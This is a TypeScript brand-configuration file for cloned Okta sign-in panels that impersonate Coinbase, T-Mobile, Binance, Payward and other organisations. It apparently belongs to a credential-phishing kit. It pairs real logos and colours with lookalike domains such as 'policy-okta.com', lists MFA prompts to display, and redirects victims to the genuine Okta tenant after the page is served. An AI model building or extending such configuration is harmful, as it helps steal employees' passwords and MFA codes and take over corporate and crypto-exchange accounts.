/**
 * Centralized Brand Configuration
 *
 * This file defines all brand-specific settings for the Okta login panels.
 * Structure matches oktalogin.html configuration approach.
 */

export interface BrandConfig {
  id: string;
  domains: string[];

  // Organization Info
  orgName: string;
  appName: string;

  // Logo
  logoUrl: string;
  logoHeight: string;

  // Colors
  primaryColor: string;
  primaryColorHover: string;
  backgroundColor: string;
  cardBackground: string;
  titleColor: string;
  labelColor: string;
  linkColor: string;
  inputBorder: string;

  // Optional background image
  backgroundImage?: string;

  // Feature flags
  showPoweredByOkta: boolean;
  showPrivacyPolicy: boolean;
  showUnlockAccount: boolean;
  showMfa: boolean;
  // Whether to show the profile/beacon element above sign-in
  showProfileBeacon?: boolean;
  // Optional small image shown centered on the "OR" separator when enabled
  profileBeacon?: boolean;
  // Whether sign-in with PIV/CAC card is enabled for this brand
  pivCacEnabled?: boolean;

  // Per-brand MFA options. If omitted, all methods are considered available when showMfa is true.
  mfaOptions?: {
    fastpass?: boolean;
    googleAuthenticator?: boolean;
    securityKey?: boolean;
    phone?: boolean;
    sms?: boolean;
    code?: boolean;
    push?: boolean;
  };

  // URLs
  helpUrl: string;
  forgotPasswordUrl: string;
  unlockAccountUrl: string;
  privacyPolicyUrl: string;
  successRedirect: string;
  // Optional per-brand UI text overrides
  keepMeText?: string;
  helpLinkText?: string;
  forgotPasswordText?: string;
  nextButtonText?: string;
}

// ============================================================================
// BRAND DEFINITIONS
// ============================================================================

export const BRANDS: Record<string, BrandConfig> = {

  // ---------------------------------------------------------------------------
  // REYES HOLDINGS
  // ---------------------------------------------------------------------------
  'reyes': {
    id: 'reyes',
    domains: ['reyesholdingsokta.okta.com', 'reyes.localhost', 'reyes.local'],

    orgName: 'ReyesholdingsOkta',
    appName: 'Okta Dashboard',
    logoUrl: '/brands/reyes/companies.png',
    logoHeight: '30px',

    primaryColor: '#1662dd',
    primaryColorHover: '#1456c2',
    backgroundColor: '#f9f9f9',
    cardBackground: '#ffffff',
    titleColor: '#6e6e78',
    labelColor: '#5e5e5e',
    linkColor: '#6e6e78',
    inputBorder: '#8c8c96',

    showPoweredByOkta: true,
    showPrivacyPolicy: true,
    showUnlockAccount: false,
    showMfa: true,
    showProfileBeacon: true,
    profileBeacon: false,
    mfaOptions: {
      fastpass: true,
      googleAuthenticator: true,
      securityKey: true,
      phone: true,
      sms: true,
      code: true,
      push: true,
    },
    pivCacEnabled: true,

    helpUrl: '#',
    forgotPasswordUrl: '#',
    unlockAccountUrl: '#',
    privacyPolicyUrl: '#',
    successRedirect: 'https://reyesholdingsokta.okta.com/',
  },

  // ---------------------------------------------------------------------------
  // COINBASE
  // ---------------------------------------------------------------------------
  'coinbase': {
    id: 'coinbase',
    domains: ['policy-okta.com', 'coinbase.localhost', 'coinbase.local'],

    orgName: 'Coinbase',
    appName: 'Okta Dashboard',
    logoUrl: 'https://images.ctfassets.net/q5ulk4bp65r7/3TBS4oVkD1ghowTqVQJlqj/2dfd4ea3b623a7c0d8deb2ff445dee9e/Consumer_Wordmark.svg',
    logoHeight: '32px',

    primaryColor: '#0052ff',
    primaryColorHover: '#0040cc',
    backgroundColor: '#0052ff',
    cardBackground: '#ffffff',
    titleColor: '#6e6e78',
    labelColor: '#5e5e5e',
    linkColor: '#6e6e78',
    inputBorder: '#8c8c96',

    showPoweredByOkta: true,
    showPrivacyPolicy: true,
    showUnlockAccount: true,
    showMfa: true,
    mfaOptions: {
      fastpass: true,
      googleAuthenticator: false,
      securityKey: false,
      phone: false,
      sms: false,
      code: false,
      push: false,
    },
    pivCacEnabled: true,

    helpUrl: '#',
    forgotPasswordUrl: '#',
    unlockAccountUrl: '#',
    privacyPolicyUrl: '#',
    successRedirect: 'https://coinbase.okta.com/',
  },

  // ---------------------------------------------------------------------------
  // WCG
  // ---------------------------------------------------------------------------
  'wcg': {
    id: 'wcg',
    domains: ['wcgkey.okta.com', 'wcg.localhost', 'wcg.local'],

    orgName: 'WCG',
    appName: 'Okta Dashboard',
    logoUrl: 'https://ok14static.oktacdn.com/fs/bco/1/fs08dhkcbaX7bFyKo697',
    logoHeight: '40px',

    primaryColor: '#1662dd',
    primaryColorHover: '#1456c2',
    backgroundColor: '#f9f9f9',
    cardBackground: '#ffffff',
    titleColor: '#6e6e78',
    labelColor: '#5e5e5e',
    linkColor: '#6e6e78',
    inputBorder: '#8c8c96',

    showPoweredByOkta: true,
    showPrivacyPolicy: true,
    showUnlockAccount: true,
    showMfa: true,
    mfaOptions: {
      fastpass: true,
      googleAuthenticator: true,
      securityKey: true,
      phone: true,
      sms: true,
      code: true,
      push: true,
    },
    pivCacEnabled: true,

    helpUrl: '#',
    forgotPasswordUrl: '#',
    unlockAccountUrl: '#',
    privacyPolicyUrl: '#',
    successRedirect: 'https://wcgkey.okta.com/',
  },

  // ---------------------------------------------------------------------------
  // ARISE
  // ---------------------------------------------------------------------------
  'arise': {
    id: 'arise',
    domains: ['arise.okta.com', 'arise.localhost', 'arise.local'],

    orgName: 'Arise',
    appName: 'Okta Dashboard',
    logoUrl: 'https://ok11static.oktacdn.com/fs/bco/1/fs0cj9x5foSMCGCKI357',
    logoHeight: '40px',

    primaryColor: '#007dc1',
    primaryColorHover: '#0073b2',
    backgroundColor: '#f9f9f9',
    cardBackground: '#ffffff',
    titleColor: '#6e6e78',
    labelColor: '#5e5e5e',
    linkColor: '#6e6e78',
    inputBorder: '#8c8c96',

    showPoweredByOkta: true,
    showPrivacyPolicy: true,
    showUnlockAccount: false,
    showMfa: true,
    mfaOptions: {
      fastpass: true,
      googleAuthenticator: true,
      securityKey: true,
      phone: true,
      sms: true,
      code: true,
      push: true,
    },
    pivCacEnabled: true,

    helpUrl: '#',
    forgotPasswordUrl: '#',
    unlockAccountUrl: '#',
    privacyPolicyUrl: '#',
    successRedirect: 'https://arise.okta.com/',
  },

  // ---------------------------------------------------------------------------
  // T-MOBILE
  // ---------------------------------------------------------------------------
  'tmobile': {
    id: 'tmobile',
    domains: ['t-mobile.okta.com', 'tmobile.localhost', 'tmo.local'],

    orgName: 'T-Mobile',
    appName: 'Okta Dashboard',
    logoUrl: 'https://ok12static.oktacdn.com/fs/bco/7/fs08b99h5bkJjd0ap297',
    logoHeight: '40px',

    primaryColor: '#e20074',
    primaryColorHover: '#b8005d',
    backgroundColor: '#f9f9f9',
    cardBackground: '#ffffff',
    titleColor: '#6e6e78',
    labelColor: '#5e5e5e',
    linkColor: '#6e6e78',
    inputBorder: '#8c8c96',
    backgroundImage: '/brands/tmobile/background.jpeg',

    showPoweredByOkta: true,
    showPrivacyPolicy: true,
    showUnlockAccount: false,
    showMfa: true,
    mfaOptions: {
      fastpass: true,
      googleAuthenticator: true,
      securityKey: true,
      phone: true,
      sms: true,
      code: true,
      push: true,
    },
    pivCacEnabled: true,

    helpUrl: '#',
    forgotPasswordUrl: 'https://passwordreset.t-mobile.com',
    unlockAccountUrl: '#',
    privacyPolicyUrl: '#',
    successRedirect: 'https://t-mobile.okta.com/',
  },
  // ---------------------------------------------------------------------------
  // BINANCE
  // ---------------------------------------------------------------------------
  'binance': {
    id: 'binance',
    domains: ['binance.okta.com', 'binance.localhost', 'binance.local'],

    orgName: 'Binance',
    appName: 'Binance Sign In',
    // Placeholder paths — replace with real assets (logo/background) after fetching
    logoUrl: 'https://ok7static.oktacdn.com/fs/bco/1/fs09ixue0AbNU15D8356',
    logoHeight: '36px',

    // Binance brand colors (placeholder)
    primaryColor: '#1662dd',
    primaryColorHover: '#1456c2',
    backgroundColor: '#f9f9f9',
    cardBackground: '#ffffff',
    titleColor: '#6e6e78',
    labelColor: '#5e5e5e',
    linkColor: '#6e6e78',
    inputBorder: '#8c8c96',
    // common pattern for Binance-like pages: use a background image behind the card
    backgroundImage: '/brands/binance/background.png',

    showPoweredByOkta: true,
    showPrivacyPolicy: true,
    showUnlockAccount: false,
    showMfa: true,
    showProfileBeacon: true,
    profileBeacon: true,

    mfaOptions: {
      fastpass: true,
      googleAuthenticator: true,
      securityKey: true,
      phone: true,
      sms: true,
      code: true,
      push: true,
    },
    pivCacEnabled: false,

    helpUrl: '#',
    forgotPasswordUrl: '#',
    unlockAccountUrl: '#',
    privacyPolicyUrl: '#',
    successRedirect: 'https://binance.okta.com/',
    // Binance-specific label overrides
    keepMeText: 'Remember me',
    helpLinkText: 'Need help signing in?',
    forgotPasswordText: 'Need help signing in?',
  },
  // ---------------------------------------------------------------------------
  // PAYWARD
  // ---------------------------------------------------------------------------
  'payward': {
    id: 'payward',
    domains: ['id.payward.com', 'payward.localhost', 'payward.local'],

    orgName: 'Payward Inc.',
    appName: 'Payward Sign In',
    // Placeholder assets: supply real logo/background files to `public/brands/payward/`
    logoUrl: 'https://ok7static.oktacdn.com/fs/bco/1/fs0tffya7ndqH7O3W357',
    logoHeight: '34px',

    // Payward uses a light card on dark background; adjust as needed
    primaryColor: '#1662dd',
    primaryColorHover: '#1456c2',
    backgroundColor: '#f9f9f9',
    cardBackground: '#ffffff',
    titleColor: '#6e6e78',
    labelColor: '#5e5e5e',
    linkColor: '#6e6e78',
    inputBorder: '#8c8c96',
    backgroundImage: '',

    showPoweredByOkta: true,
    showPrivacyPolicy: true,
    showUnlockAccount: true,
    showMfa: true,
    showProfileBeacon: false,
    mfaOptions: {
      fastpass: false,
      googleAuthenticator: true,
      securityKey: true,
      phone: true,
      sms: true,
      code: true,
      push: true,
    },
    pivCacEnabled: true,

    helpUrl: '#',
    forgotPasswordUrl: '#',
    unlockAccountUrl: '#',
    privacyPolicyUrl: '#',
    successRedirect: 'https://id.payward.com/',
  },
};

// ============================================================================
// DEFAULT BRAND
// ============================================================================

export const DEFAULT_BRAND_ID = 'wcg';

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

/**
 * Get brand configuration by domain
 */
export function getBrandByDomain(hostname: string): BrandConfig {
  const normalizedHost = hostname.toLowerCase().replace(/:\d+$/, '');

  for (const brand of Object.values(BRANDS)) {
    if (brand.domains.some(domain =>
      normalizedHost === domain ||
      normalizedHost.endsWith(`.${domain}`)
    )) {
      return brand;
    }
  }

  return BRANDS[DEFAULT_BRAND_ID];
}

/**
 * Get brand configuration by ID
 */
export function getBrandById(id: string): BrandConfig | undefined {
  return BRANDS[id];
}

/**
 * Get all available brand IDs
 */
export function getAllBrandIds(): string[] {
  return Object.keys(BRANDS);
}

